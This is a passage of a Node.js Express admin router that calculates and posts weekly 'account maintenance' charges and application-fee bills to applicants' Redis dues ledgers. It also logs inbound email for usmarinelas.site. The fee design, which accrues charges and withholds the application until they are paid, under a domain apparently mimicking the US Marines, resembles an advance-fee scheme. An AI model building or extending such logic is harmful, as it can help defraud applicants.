    weeksElapsed,
    chargeableWeeks,
    alreadyCharged,
    newWeeks,
    newAmount: parseFloat((newWeeks * MAINTENANCE_FEE_PER_WEEK).toFixed(2)),
    totalChargeableAmount: parseFloat((chargeableWeeks * MAINTENANCE_FEE_PER_WEEK).toFixed(2))
  };
}

// DRY RUN — scan all users and return who would be charged and how much
router.get('/maintenance-scan', adminMiddleware, async (req, res) => {
  try {
    const allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    const now = new Date();
    const results = [];

    for (const uid of allUserIds) {
      const user = await getUser(uid);
      if (!user) continue;
      const calc = calcMaintenanceWeeks(user, now);
      results.push({
        userId: uid,
        fullName: user.fullName,
        email: user.email,
        applicationNumber: user.applicationNumber,
        stageStatus: user.stageStatus,
        applicationFeeVerifiedAt: user.applicationFeeVerifiedAt || user.applicationFeeSubmittedAt || null,
        ...calc
      });
    }

    const chargeable = results.filter(r => r.eligible && r.newWeeks > 0);
    const alreadyMaxed = results.filter(r => r.eligible && r.newWeeks === 0 && r.chargeableWeeks > 0);
    const notEligible = results.filter(r => !r.eligible);

    res.json({
      summary: {
        totalScanned: results.length,
        chargeable: chargeable.length,
        totalNewAmount: parseFloat(chargeable.reduce((s, r) => s + r.newAmount, 0).toFixed(2)),
        alreadyMaxed: alreadyMaxed.length,
        notEligible: notEligible.length,
        feePerWeek: MAINTENANCE_FEE_PER_WEEK,
        freeWeeks: FREE_WEEKS
      },
      chargeable,
      alreadyMaxed
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// COMMIT — actually add the maintenance bills
router.post('/maintenance-charge', adminMiddleware, async (req, res) => {
  try {
    // Optional: charge only specific userIds; omit to charge all eligible
    const { userIds } = req.body; // array or null/undefined
    const allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    const now = new Date();
    const charged = [];
    const skipped = [];

    const targets = userIds && Array.isArray(userIds) && userIds.length
      ? allUserIds.filter(id => userIds.includes(id))
      : allUserIds;

    for (const uid of targets) {
      const user = await getUser(uid);
      if (!user) continue;

      const calc = calcMaintenanceWeeks(user, now);
      if (!calc.eligible || calc.newWeeks <= 0) {
        skipped.push({ userId: uid, fullName: user.fullName, reason: !calc.eligible ? (calc.reason || 'not_eligible') : 'already_charged' });
        continue;
      }

      // Add a maintenance bill to the dues ledger
      const dues = JSON.parse(await redis.get(`dues:${uid}`) || '[]');
      const entry = {
        id: `maint-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
        type: 'account_maintenance',
        label: `Account Maintenance — ${calc.newWeeks} week${calc.newWeeks > 1 ? 's' : ''} (${new Date(calc.startDate).toLocaleDateString()} onward)`,
        amount: calc.newAmount,
        amountPaid: 0,
        status: 'unpaid',
        maintenanceWeeks: calc.newWeeks,
        maintenanceStartDate: calc.startDate,
        chargedAt: now.toISOString(),
        createdAt: now.toISOString(),
        receipts: [],
        autoCharged: true
      };
      dues.push(entry);
      await redis.set(`dues:${uid}`, JSON.stringify(dues));

      // Update user: bump chargedWeeks counter, activate dues alert
      user.maintenanceFeeChargedWeeks = calc.chargeableWeeks; // mark up to current chargeable weeks
      user.hasDues = true;
      user.duesAlertActive = true;
      user.duesAlertMessage = user.duesAlertMessage || `You have an outstanding account maintenance balance of $${calc.newAmount.toFixed(2)}. Please settle your dues to continue your application.`;
      user.updatedAt = now.toISOString();
      await redis.set(`user:${uid}`, JSON.stringify(user));

      charged.push({
        userId: uid,
        fullName: user.fullName,
        email: user.email,
        applicationNumber: user.applicationNumber,
        newWeeks: calc.newWeeks,
        newAmount: calc.newAmount,
        totalChargeableWeeks: calc.chargeableWeeks,
        startDate: calc.startDate
      });
    }

    res.json({
      success: true,
      charged: charged.length,
      skipped: skipped.length,
      totalAmount: parseFloat(charged.reduce((s, r) => s + r.newAmount, 0).toFixed(2)),
      details: charged,
      skippedDetails: skipped
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

// Also record applicationFeeVerifiedAt when approving the fee, so the clock starts precisely.
// Patch approve-application-fee to stamp this (done inline below via a helper call on approval).

// ─── MIGRATE: seed application fee bill onto all existing accounts ────────────
// Safe to run multiple times — skips users who already have the bill.
router.post('/migrate/seed-app-fee-bills', adminMiddleware, async (req, res) => {
  try {
    const allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    let seeded = 0, alreadyHad = 0, skipped = 0;

    for (const uid of allUserIds) {
      const user = await getUser(uid);
      if (!user) { skipped++; continue; }

      const dues = JSON.parse(await redis.get(`dues:${uid}`) || '[]');
      const existing = dues.find(d => d.isApplicationFee);
      if (existing) { alreadyHad++; continue; }

      const APPLICATION_FEE_AMOUNT = user.applicationFee || 239;
      const now = new Date().toISOString();

      // Determine status based on current user state
      let status, amountPaid, pendingPaymentId, paidAt;
      if (user.applicationFeeVerified) {
        // Admin already approved — mark paid
        status = 'paid';
        amountPaid = APPLICATION_FEE_AMOUNT;
        pendingPaymentId = null;
        paidAt = user.applicationFeeVerifiedAt || user.updatedAt || now;
      } else if (user.stageStatus === 'awaiting_payment_verification') {
        // Receipt submitted, pending admin review
        status = 'unpaid';
        amountPaid = 0;
        pendingPaymentId = `appfee-pending-${uid}`;
      } else if (user.stageStatus === 'payment_rejected') {
        // Receipt was rejected — unpaid, user must re-submit
        status = 'unpaid';
        amountPaid = 0;
        pendingPaymentId = null;
      } else {
        // Not yet submitted
        status = 'unpaid';
        amountPaid = 0;
        pendingPaymentId = null;
      }

      const bill = {
        id: `appfee-${uid}`,
        type: 'application_fee',
        label: 'Application Fee',
        amount: APPLICATION_FEE_AMOUNT,
        amountPaid: amountPaid || 0,
        status,
        isApplicationFee: true,
        createdAt: user.createdAt || now,
        updatedAt: now,
        receipts: [],
        ...(paidAt ? { paidAt } : {}),
        ...(pendingPaymentId ? { pendingPaymentId, pendingSubmittedAt: user.applicationFeeSubmittedAt || now } : {})
      };

      dues.unshift(bill); // put application fee first
      await redis.set(`dues:${uid}`, JSON.stringify(dues));

      // Update user dues flags
      const totalUnpaid = dues.reduce((s, d) => s + Math.max(0, (d.amount || 0) - (d.amountPaid || 0)), 0);
      user.hasDues = true;
      if (!user.applicationFeeVerified && totalUnpaid > 0.001) {
        user.duesAlertActive = true;
        if (!user.duesAlertMessage) {
          user.duesAlertMessage = `Your application fee of $${APPLICATION_FEE_AMOUNT.toFixed(2)} is outstanding. Please make payment to proceed.`;
        }
      } else {
        user.duesAlertActive = totalUnpaid > 0.001;
      }
      user.updatedAt = now;
      await redis.set(`user:${uid}`, JSON.stringify(user));

      seeded++;
    }

    res.json({ success: true, seeded, alreadyHad, skipped, total: allUserIds.length });
  } catch (e) { res.status(500).json({ error: e.message || 'Server error' }); }
});

router.post('/inbound-email', async (req, res) => {
  try {
    const secret = process.env.INBOUND_EMAIL_SECRET;
    if (secret && req.headers['x-inbound-secret'] !== secret) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    const p = req.body || {};
    const body = stripTags(p.html || p.text || '');
    await logEmail({
      dir: 'received',
      from: p.from || 'unknown',
      to: p.to || 'info@usmarinelas.site',
      subject: p.subject || '(no subject)',
      body: body.slice(0, 4000)
    });
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

export default router;
